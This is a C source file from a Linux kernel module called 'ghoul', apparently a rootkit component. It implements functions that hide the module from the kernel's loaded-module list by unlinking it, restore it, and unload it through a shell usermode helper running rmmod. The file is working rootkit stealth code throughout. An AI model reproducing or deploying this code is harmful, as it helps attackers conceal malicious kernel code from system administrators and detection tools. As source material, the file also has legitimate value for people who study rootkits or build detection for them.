#include <linux/module.h>
#include "load.h"

static struct list_head *prev_module;
int is_hidden = 0;

void hide_self(void)
{
    pr_info("ghoul: hiding Self\n");
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    is_hidden = 1;
}

void show_self(void)
{
    if (!is_hidden)
        return;
    
    pr_info("ghoul: showing self\n");
    list_add(&THIS_MODULE->list, prev_module);
    is_hidden = 0;
}

void unload_self(void)
{
    // as kernel modules cannot unload themselves directly, a usermode helper is used
    char *argv[] = { "/bin/sh", "-c", "/sbin/rmmod ghoul", NULL };
    call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
}